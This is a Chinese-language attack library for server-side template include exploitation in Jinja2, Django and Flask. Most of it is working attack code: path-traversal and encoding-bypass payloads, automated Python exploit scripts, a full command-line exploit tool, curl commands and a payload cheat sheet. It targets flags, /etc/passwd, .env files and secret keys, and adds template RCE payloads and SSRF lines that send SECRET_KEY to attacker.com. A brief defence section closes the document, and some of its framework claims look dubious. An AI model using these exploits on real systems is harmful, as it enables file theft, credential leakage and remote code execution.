# SSTI-Include文件包含-攻击库

## 概述

**攻击类型**：Server-Side Template Injection - Include指令文件包含  
**影响框架**：Jinja2/Django/Flask  
**风险等级**：Critical  
**攻击目标**：利用模板引擎的include指令实现路径遍历和任意文件包含

**核心原理**：
当应用程序使用模板引擎的`{% include %}`指令动态包含用户控制的文件路径时，攻击者可以通过路径遍历技术包含和渲染任意文件，从而读取敏感信息甚至执行代码。

**与传统SSTI的区别**：
- **传统SSTI**：注入模板表达式如`{{7*7}}`执行代码
- **Include SSTI**：利用include指令的路径遍历功能包含文件
- **攻击目标**：主要是文件读取，而非直接代码执行

---

## 核心攻击技术

### 技术1：基本Include路径遍历

**原理**：
Jinja2的`{% include %}`指令支持动态文件包含，如果包含的路径来自用户输入且未严格验证，可以使用`../`进行目录遍历。

**漏洞代码示例**：
```python
# 错误的实现
@app.route('/error')
def error():
    error_type = request.args.get('error_type', 'default.html')
    
    # 不安全的路径检查
    safe_dir = '/var/www/app/static/'
    final_path = os.path.realpath(os.path.join(safe_dir, error_type))
    
    if os.path.commonprefix((final_path, safe_dir)) != safe_dir: 
        return Response('Invalid path', status=400)
    
    # error.html中有: {% include error_type %}
    return render_template('error.html', error_type=final_path[len(safe_dir):])
```

**攻击Payload**：
```bash
# 基本路径遍历
?error_type=../../../../etc/passwd

# 多层遍历
?error_type=../../../../../flag.txt

# 读取应用配置
?error_type=../../config.py

# 读取系统文件
?error_type=../../../../etc/hosts
```

**绕过技术**：
```bash
# URL编码绕过
?error_type=..%2f..%2f..%2fetc%2fpasswd

# 双重编码
?error_type=..%252f..%252f..%252fetc%252fpasswd

# 使用符号链接
?error_type=../../symlink_to_flag

# 绝对路径尝试
?error_type=/etc/passwd
```

**自动化利用代码**：
```python
def exploit_basic_include(target_url, session):
    """基本Include路径遍历利用"""
    
    # 常见敏感文件路径
    target_files = [
        '../../../../../flag.txt',
        '../../../../../flag',
        '../../../../../FLAG',
        '../../../../etc/passwd',
        '../../../../etc/hosts',
        '../../../config.py',
        '../../../settings.py',
        '../../../app/config.py',
    ]
    
    for file_path in target_files:
        try:
            # 构造请求
            params = {'error_type': file_path}
            r = session.get(f"{target_url}/error", params=params, timeout=10)
            
            # 检测成功标志
            if r.status_code == 200:
                if 'flag{' in r.text.lower() or 'root:' in r.text:
                    print(f"[+] 成功包含文件: {file_path}")
                    return r.text
                    
        except Exception as e:
            continue
    
    return None
```

---

### 技术2：绕过os.path.commonprefix检查

**原理**：
`os.path.commonprefix()`函数仅执行字符串前缀匹配，不进行真正的路径规范化，可以通过符号链接、特殊路径等方式绕过。

**漏洞代码示例**：
```python
# 脆弱的路径检查
safe_dir = '/var/www/app/static/'
final_path = os.path.realpath(os.path.join(safe_dir, error_type))

# ⚠️ 脆弱点：commonprefix只做字符串前缀匹配
if os.path.commonprefix((final_path, safe_dir)) != safe_dir: 
    return Response('Invalid path', status=400)
```

**绕过技术1 - 符号链接攻击**：
```bash
# 1. 上传包含符号链接的文件（如通过图片上传）
# 创建符号链接指向敏感文件
ln -s /flag /tmp/symlink_flag

# 2. 在include中引用符号链接
?error_type=../../../tmp/symlink_flag
```

**绕过技术2 - 路径规范化差异**：
```python
# 利用路径解析差异
payloads = [
    'templates/../../../../../../flag',     # realpath会规范化
    'templates/../../../flag.txt',
    './templates/../../../../flag',
    'templates/./../../../../../../flag',
]
```

**绕过技术3 - Unicode字符**：
```bash
# 使用Unicode字符的特殊形式
?error_type=..%c0%af..%c0%af..%c0%afflag

# 使用宽字符编码
?error_type=..%u2216..%u2216flag
```

**完整绕过利用代码**：
```python
def bypass_commonprefix_check(target_url, session):
    """绕过os.path.commonprefix检查"""
    
    bypass_payloads = [
        # 基本遍历
        '../../../../../flag.txt',
        
        # 多种编码
        '..%2f..%2f..%2f..%2fflag',
        '..%252f..%252f..%252fflag',
        
        # 路径规范化差异
        './templates/../../../../flag',
        'templates/../../../../../flag',
        'templates/./../../../../flag',
        
        # 空字节注入（Python2）
        '../../../../../flag%00.html',
        
        # 绝对路径尝试
        '/flag',
        '/FLAG.txt',
    ]
    
    for payload in bypass_payloads:
        try:
            r = session.get(f"{target_url}/error", 
                          params={'error_type': payload}, 
                          timeout=10)
            
            if r.status_code == 200 and ('flag{' in r.text.lower() or len(r.text) > 100):
                print(f"[+] 绕过成功: {payload}")
                print(f"[+] 内容: {r.text[:200]}")
                return r.text
                
        except Exception as e:
            continue
    
    return None
```

---

### 技术3：Include结合模板注入

**原理**：
即使路径检查严格，如果能够上传包含恶意模板代码的文件，再通过include包含该文件，就能执行模板注入。

**攻击流程**：
```
1. 上传包含模板代码的文件 → 2. Include包含该文件 → 3. 模板引擎执行代码
```

**步骤1 - 上传恶意模板文件**：
```python
# 利用图片上传功能上传恶意"图片"
malicious_content = """
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
"""

# 保存为image.png（实际是模板文件）
files = {'image': ('image.png', malicious_content, 'image/png')}
session.post(f"{target_url}/upload", files=files)
```

**步骤2 - Include包含上传的文件**：
```bash
# 假设文件上传到static/uploads/image.png
?error_type=../uploads/image.png
```

**完整利用代码**：
```python
def exploit_include_with_upload(target_url, session):
    """结合文件上传的Include攻击"""
    
    # 1. 准备恶意模板内容
    malicious_templates = [
        # 读取文件
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
        
        # 访问全局对象
        "{{config.items()}}",
        
        # RCE payload
        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}",
    ]
    
    for i, template in enumerate(malicious_templates):
        try:
            # 2. 上传恶意模板文件
            filename = f'exploit_{i}.png'
            files = {
                'profile_picture': (filename, template, 'image/png')
            }
            
            r = session.post(f"{target_url}/upload", files=files)
            
            if r.status_code == 200:
                print(f"[+] 文件上传成功: {filename}")
                
                # 3. Include包含上传的文件
                r = session.get(f"{target_url}/error", 
                              params={'error_type': f'../uploads/{filename}'})
                
                if 'flag{' in r.text.lower():
                    print(f"[+] Include执行成功!")
                    print(f"[+] FLAG: {r.text}")
                    return r.text
                    
        except Exception as e:
            continue
    
    return None
```

---

### 技术4：Include读取应用源码

**原理**：
通过Include包含应用程序自身的源代码文件，可以获取敏感配置、数据库密码、API密钥等信息。

**目标文件清单**：
```python
source_files = [
    # Python应用
    '../app.py',
    '../main.py',
    '../config.py',
    '../settings.py',
    '../models.py',
    '../views.py',
    '../../.env',
    '../../config/database.yml',
    
    # Django应用
    '../settings.py',
    '../urls.py',
    '../wsgi.py',
    
    # Flask应用
    '../__init__.py',
    '../routes.py',
    '../config.py',
]
```

**攻击Payload**：
```bash
# 读取Flask应用配置
?error_type=../../config.py

# 读取环境变量文件
?error_type=../../../.env

# 读取数据库配置
?error_type=../../config/database.yml
```

**自动化源码泄露利用**：
```python
def leak_source_code(target_url, session):
    """利用Include读取应用源码"""
    
    source_files = [
        # Python应用核心文件
        '../app.py',
        '../main.py',
        '../config.py',
        '../settings.py',
        '../../.env',
        
        # 配置文件
        '../../../config/database.yml',
        '../../../config/secrets.yml',
        
        # 框架特定文件
        '../__init__.py',
        '../routes.py',
        '../models.py',
    ]
    
    leaked_files = {}
    
    for file_path in source_files:
        try:
            r = session.get(f"{target_url}/error", 
                          params={'error_type': file_path}, 
                          timeout=10)
            
            if r.status_code == 200 and len(r.text) > 50:
                # 检测是否是Python代码或配置文件
                if ('import ' in r.text or 'def ' in r.text or 
                    'SECRET' in r.text or 'PASSWORD' in r.text):
                    
                    print(f"[+] 成功读取: {file_path}")
                    leaked_files[file_path] = r.text
                    
                    # 提取敏感信息
                    if 'SECRET' in r.text or 'PASSWORD' in r.text:
                        print(f"[!] 发现敏感配置!")
                        
        except Exception as e:
            continue
    
    return leaked_files
```

---

### 技术5：盲Include检测

**原理**：
当Include操作不直接显示文件内容时，可以通过副作用（错误消息、响应时间、响应大小）来判断文件是否存在和包含是否成功。

**检测技术1 - 错误消息差异**：
```python
def blind_include_error_based(target_url, session):
    """基于错误消息的盲Include检测"""
    
    # 1. 包含存在的文件（应该没有错误）
    r1 = session.get(f"{target_url}/error", 
                    params={'error_type': '../templates/exists.html'})
    
    # 2. 包含不存在的文件（应该有错误）
    r2 = session.get(f"{target_url}/error", 
                    params={'error_type': '../templates/notexist.html'})
    
    # 3. 比较响应差异
    if r1.status_code != r2.status_code:
        print("[+] 可以通过状态码差异检测文件存在性")
        return True
    
    if len(r1.text) != len(r2.text):
        print("[+] 可以通过响应长度差异检测文件存在性")
        return True
    
    return False
```

**检测技术2 - 响应大小差异**：
```python
def blind_include_size_based(target_url, session, test_file):
    """基于响应大小的盲Include检测"""
    
    # 包含测试文件
    r = session.get(f"{target_url}/error", 
                   params={'error_type': test_file})
    
    # 记录响应大小
    size = len(r.text)
    
    # 包含空文件（基准）
    r_baseline = session.get(f"{target_url}/error", 
                            params={'error_type': 'empty.html'})
    
    size_baseline = len(r_baseline.text)
    
    # 比较大小差异
    if abs(size - size_baseline) > 100:
        print(f"[+] 文件 {test_file} 可能存在 (大小差异: {size - size_baseline})")
        return True
    
    return False
```

**检测技术3 - 时间盲注**：
```python
import time

def blind_include_time_based(target_url, session):
    """基于时间的盲Include检测"""
    
    # 包含大文件（应该更慢）
    start = time.time()
    session.get(f"{target_url}/error", 
               params={'error_type': '../../../../../var/log/syslog'})
    elapsed_large = time.time() - start
    
    # 包含小文件（应该更快）
    start = time.time()
    session.get(f"{target_url}/error", 
               params={'error_type': '../templates/small.html'})
    elapsed_small = time.time() - start
    
    # 比较时间差异
    if elapsed_large > elapsed_small * 2:
        print("[+] 可以通过响应时间差异检测文件大小")
        return True
    
    return False
```

---

### 技术6：Include配合SSRF

**原理**：
某些模板引擎的include指令支持包含远程URL，可以结合SSRF攻击内部服务或外带数据。

**Django远程Include**：
```python
# Django模板支持include远程文件（如果配置允许）
{% include "http://attacker.com/evil.html" %}
```

**攻击Payload**：
```bash
# 包含远程恶意模板
?error_type=http://attacker.com/malicious_template.html

# 外带敏感数据
?error_type=http://attacker.com/exfil?data={{config.SECRET_KEY}}

# SSRF攻击内网
?error_type=http://127.0.0.1:8080/admin
?error_type=http://192.168.1.100/internal_api
```

**利用代码**：
```python
def exploit_include_ssrf(target_url, session, attacker_server):
    """Include配合SSRF攻击"""
    
    # 1. 在攻击者服务器上准备恶意模板
    malicious_template = """
    {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
    """
    
    # 2. 构造Include远程URL
    remote_url = f"{attacker_server}/evil.html"
    
    # 3. 触发Include
    r = session.get(f"{target_url}/error", 
                   params={'error_type': remote_url})
    
    if r.status_code == 200:
        print(f"[+] 成功Include远程文件")
        return r.text
    
    return None
```

---

### 技术7：多层Include嵌套

**原理**：
利用模板引擎支持嵌套include的特性，构造多层include来绕过某些过滤或限制。

**嵌套Include示例**：
```jinja2
<!-- template1.html -->
{% include error_type %}

<!-- template2.html (被include的文件) -->
{% include "../../../../../flag.txt" %}
```

**攻击流程**：
```
1. 上传template2.html → 2. Include template2.html → 3. template2再Include flag
```

**利用代码**：
```python
def exploit_nested_include(target_url, session):
    """多层Include嵌套攻击"""
    
    # 1. 创建包含嵌套include的模板
    nested_template = """
    {% include "../../../../../flag.txt" %}
    """
    
    # 2. 上传嵌套模板
    files = {
        'upload': ('nested.html', nested_template, 'text/html')
    }
    session.post(f"{target_url}/upload", files=files)
    
    # 3. Include上传的嵌套模板
    r = session.get(f"{target_url}/error", 
                   params={'error_type': '../uploads/nested.html'})
    
    if 'flag{' in r.text.lower():
        print("[+] 嵌套Include攻击成功!")
        return r.text
    
    return None
```

---

## 完整自动化利用工具

```python
#!/usr/bin/env python3
"""
SSTI Include文件包含完整利用工具
"""
import requests
import sys
import re
import time
from urllib.parse import quote

class SSTIIncludeExploit:
    def __init__(self, target_url, session=None):
        self.target_url = target_url.rstrip('/')
        self.session = session or requests.Session()
        self.found_files = {}
    
    def test_basic_include(self, endpoint='/error', param='error_type'):
        """测试基本Include路径遍历"""
        print("[*] 测试基本Include路径遍历...")
        
        test_files = [
            '../../../../../flag.txt',
            '../../../../../flag',
            '../../../../../FLAG',
            '../../../../etc/passwd',
            '../../../config.py',
        ]
        
        for file_path in test_files:
            try:
                params = {param: file_path}
                r = self.session.get(f"{self.target_url}{endpoint}", 
                                    params=params, timeout=10)
                
                if r.status_code == 200:
                    if 'flag{' in r.text.lower():
                        print(f"[+] 找到FLAG: {file_path}")
                        self.found_files['flag'] = r.text
                        return r.text
                    elif 'root:' in r.text:
                        print(f"[+] 成功读取/etc/passwd: {file_path}")
                        self.found_files['passwd'] = r.text
                        
            except Exception as e:
                continue
        
        return None
    
    def bypass_path_check(self, endpoint='/error', param='error_type'):
        """绕过路径检查"""
        print("[*] 尝试绕过路径检查...")
        
        bypass_payloads = [
            '../../../../../flag',
            '..%2f..%2f..%2f..%2fflag',
            '..%252f..%252f..%252fflag',
            './templates/../../../../flag',
            'templates/../../../../../flag',
            '/flag',
        ]
        
        for payload in bypass_payloads:
            try:
                params = {param: payload}
                r = self.session.get(f"{self.target_url}{endpoint}", 
                                    params=params, timeout=10)
                
                if r.status_code == 200 and 'flag{' in r.text.lower():
                    print(f"[+] 绕过成功: {payload}")
                    return r.text
                    
            except Exception as e:
                continue
        
        return None
    
    def leak_source_files(self, endpoint='/error', param='error_type'):
        """泄露应用源码"""
        print("[*] 尝试读取应用源码...")
        
        source_files = [
            '../app.py',
            '../main.py',
            '../config.py',
            '../settings.py',
            '../../.env',
            '../routes.py',
            '../models.py',
        ]
        
        for file_path in source_files:
            try:
                params = {param: file_path}
                r = self.session.get(f"{self.target_url}{endpoint}", 
                                    params=params, timeout=10)
                
                if r.status_code == 200 and len(r.text) > 50:
                    if 'import ' in r.text or 'def ' in r.text:
                        print(f"[+] 成功读取: {file_path}")
                        self.found_files[file_path] = r.text
                        
                        # 检查敏感信息
                        if 'SECRET' in r.text or 'PASSWORD' in r.text:
                            print(f"[!] 发现敏感配置: {file_path}")
                            
            except Exception as e:
                continue
        
        return self.found_files
    
    def blind_include_detect(self, endpoint='/error', param='error_type'):
        """盲Include检测"""
        print("[*] 执行盲Include检测...")
        
        # 包含存在的文件
        r1 = self.session.get(f"{self.target_url}{endpoint}", 
                             params={param: '../templates/base.html'})
        
        # 包含不存在的文件
        r2 = self.session.get(f"{self.target_url}{endpoint}", 
                             params={param: '../templates/notexist12345.html'})
        
        # 比较差异
        if r1.status_code != r2.status_code:
            print("[+] 检测到状态码差异，可利用盲Include")
            return True
        
        if abs(len(r1.text) - len(r2.text)) > 100:
            print("[+] 检测到响应大小差异，可利用盲Include")
            return True
        
        return False
    
    def exploit_with_upload(self, upload_endpoint='/upload', 
                          include_endpoint='/error', param='error_type'):
        """结合文件上传的Include攻击"""
        print("[*] 尝试上传+Include组合攻击...")
        
        # 恶意模板内容
        malicious_template = "{{config.items()}}"
        
        try:
            # 上传恶意文件
            files = {
                'image': ('exploit.png', malicious_template, 'image/png')
            }
            r = self.session.post(f"{self.target_url}{upload_endpoint}", 
                                 files=files)
            
            if r.status_code == 200:
                print("[+] 文件上传成功")
                
                # Include上传的文件
                r = self.session.get(f"{self.target_url}{include_endpoint}", 
                                    params={param: '../uploads/exploit.png'})
                
                if r.status_code == 200:
                    print("[+] Include执行成功")
                    return r.text
                    
        except Exception as e:
            print(f"[-] 上传攻击失败: {e}")
        
        return None
    
    def full_exploit(self, login_endpoint=None, login_data=None):
        """完整利用流程"""
        print("="*60)
        print("SSTI Include文件包含完整利用工具")
        print("="*60 + "\n")
        
        # 1. 登录（如果需要）
        if login_endpoint and login_data:
            print("[*] 执行登录...")
            r = self.session.post(f"{self.target_url}{login_endpoint}", 
                                 data=login_data)
            print("[+] 登录完成\n")
        
        # 2. 测试基本Include
        result = self.test_basic_include()
        if result and 'flag{' in result.lower():
            print("\n[+] 攻击成功!")
            return result
        
        # 3. 尝试绕过路径检查
        result = self.bypass_path_check()
        if result:
            print("\n[+] 绕过攻击成功!")
            return result
        
        # 4. 尝试读取源码
        self.leak_source_files()
        
        # 5. 盲Include检测
        self.blind_include_detect()
        
        # 6. 上传+Include组合
        result = self.exploit_with_upload()
        if result:
            print("\n[+] 组合攻击成功!")
            return result
        
        print("\n[-] 所有攻击方法均未成功")
        return None

# 命令行使用
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL> [登录用户名] [登录密码]")
        print(f"例如: {sys.argv[0]} http://target:5000")
        print(f"      {sys.argv[0]} http://target:5000 test test")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # 准备登录数据（如果提供）
    login_data = None
    if len(sys.argv) >= 4:
        login_data = {
            'username': sys.argv[2],
            'password': sys.argv[3]
        }
    
    # 执行利用
    exploit = SSTIIncludeExploit(target)
    result = exploit.full_exploit(
        login_endpoint='/login' if login_data else None,
        login_data=login_data
    )
    
    if result:
        print(f"\n[+] 最终结果:\n{result[:500]}")
```

---

## 实战场景

### 场景1：Flask错误页面Include漏洞

**应用背景**：
贷款计算器Web应用，使用Flask+Jinja2，错误页面通过include动态加载错误模板。

**漏洞代码**：
```python
@app.route('/error')
def error():
    error_type = 'templates/' + request.args.get('error_type', 'default.html')
    
    safe_dir = '/var/www/app/static/'
    final_path = os.path.realpath(os.path.join(safe_dir, error_type))
    
    if os.path.commonprefix((final_path, safe_dir)) != safe_dir: 
        return Response('Invalid path', status=400)
    
    # error.html中: {% include error_type %}
    return render_template('error.html', error_type=final_path[len(safe_dir):])
```

**利用步骤**：
```bash
# 1. 登录测试账户
curl -c cookies.txt -X POST http://target:5000/login \
  -d "username=test&password=test"

# 2. 利用Include读取FLAG
curl -b cookies.txt "http://target:5000/error?error_type=../../../../../flag"

# 3. 验证漏洞（读取/etc/passwd）
curl -b cookies.txt "http://target:5000/error?error_type=../../../../etc/passwd"
```

**Python利用脚本**：
```python
import requests

session = requests.Session()

# 登录
session.post('http://target:5000/login', 
            data={'username': 'test', 'password': 'test'})

# 利用Include读取FLAG
r = session.get('http://target:5000/error', 
               params={'error_type': '../../../../../flag.txt'})

if 'flag{' in r.text.lower():
    print(f"[+] FLAG: {r.text}")
```

---

### 场景2：Django模板Include配合文件上传

**应用背景**：
用户资料管理系统，允许上传头像图片，模板使用include加载自定义页面。

**攻击流程**：
```
上传恶意模板 → Include包含上传的文件 → 模板代码执行
```

**利用代码**：
```python
import requests

session = requests.Session()

# 1. 登录
session.post('http://target:8000/login', 
            data={'username': 'user', 'password': 'pass'})

# 2. 上传包含模板代码的"图片"
malicious_content = "{{settings.SECRET_KEY}}"
files = {
    'profile_picture': ('evil.png', malicious_content, 'image/png')
}
session.post('http://target:8000/upload', files=files)

# 3. Include包含上传的文件
r = session.get('http://target:8000/profile', 
               params={'template': '../uploads/evil.png'})

print(f"[+] SECRET_KEY: {r.text}")
```

---

### 场景3：盲Include文件探测

**应用背景**：
Include操作不显示文件内容，需通过副作用判断文件是否存在。

**探测脚本**：
```python
import requests

session = requests.Session()
session.post('http://target/login', data={'user': 'test', 'pass': 'test'})

# 探测文件列表
test_files = [
    '../config.py',
    '../settings.py',
    '../.env',
    '../flag.txt',
]

for file_path in test_files:
    r1 = session.get('http://target/error', 
                    params={'error_type': file_path})
    r2 = session.get('http://target/error', 
                    params={'error_type': 'notexist.html'})
    
    # 比较响应差异
    if len(r1.text) != len(r2.text):
        print(f"[+] 文件可能存在: {file_path} (大小差异: {len(r1.text) - len(r2.text)})")
    
    if r1.status_code != r2.status_code:
        print(f"[+] 文件可能存在: {file_path} (状态码: {r1.status_code})")
```

---

## 手动测试命令

### Curl命令测试

```bash
# 1. 登录获取session
curl -c cookies.txt -X POST http://target:5000/login \
  -d "username=test&password=test" -L

# 2. 基本Include路径遍历
curl -b cookies.txt "http://target:5000/error?error_type=../../../../../flag.txt"

# 3. URL编码绕过
curl -b cookies.txt "http://target:5000/error?error_type=..%2f..%2f..%2fflag"

# 4. 读取系统文件
curl -b cookies.txt "http://target:5000/error?error_type=../../../../etc/passwd"

# 5. 读取应用配置
curl -b cookies.txt "http://target:5000/error?error_type=../../config.py"
```

### Burp Suite测试

**Intruder Payload位置**：
```http
GET /error?error_type=§../../../../../§flag HTTP/1.1
Host: target:5000
Cookie: session=xxx
```

**Payload列表**：
```
flag
FLAG
flag.txt
FLAG.txt
etc/passwd
config.py
settings.py
.env
```

---

## Payload速查表

| 目标文件 | Payload示例 |
|---------|------------|
| FLAG文件 | `../../../../../flag.txt` |
| /etc/passwd | `../../../../etc/passwd` |
| 应用配置 | `../../config.py` |
| 环境变量 | `../../../.env` |
| 数据库配置 | `../../config/database.yml` |
| Django settings | `../settings.py` |
| Flask routes | `../routes.py` |
| 上传文件 | `../uploads/malicious.png` |

**编码变体**：
```
原始: ../../../../../flag
URL编码: ..%2f..%2f..%2f..%2fflag
双重编码: ..%252f..%252f..%252fflag
Unicode: ..%c0%af..%c0%afflag
```

---

## 防御措施

### 1. 严格的路径验证

```python
import os

def safe_include(user_input):
    # 白名单验证
    allowed_templates = [
        'error_404.html',
        'error_500.html',
        'not_implemented.html'
    ]
    
    if user_input not in allowed_templates:
        return 'default.html'
    
    return user_input
```

### 2. 禁用动态Include

```python
# 不要这样做
return render_template('error.html', error_type=user_input)

# 应该这样做
error_templates = {
    '404': 'error_404.html',
    '500': 'error_500.html'
}
template = error_templates.get(user_input, 'default.html')
return render_template(template)
```

### 3. 使用安全的路径检查

```python
import os
from pathlib import Path

def validate_path(user_input, base_dir):
    # 使用Path进行规范化
    base = Path(base_dir).resolve()
    target = (base / user_input).resolve()
    
    # 检查是否在允许目录内
    try:
        target.relative_to(base)
        return str(target)
    except ValueError:
        raise SecurityError("Path traversal detected")
```

### 4. 禁用远程Include

```python
# Django settings.py
TEMPLATES = [{
    'OPTIONS': {
        'allowed_include_roots': ['/var/www/app/templates/'],
        # 禁用远程include
        'context_processors': [],
    }
}]
```

---

## 总结

**Include文件包含SSTI攻击的核心要点**：
1. ✅ 利用模板引擎的include指令进行路径遍历
2. ✅ 绕过不完善的路径检查（如`os.path.commonprefix`）
3. ✅ 结合文件上传功能包含恶意模板
4. ✅ 通过盲注技术探测文件存在性
5. ✅ 读取应用源码获取敏感配置
6. ✅ 防御关键：白名单验证+禁用动态include

Include型SSTI攻击主要用于文件读取而非代码执行，但结合其他漏洞可以实现完整的攻击链。
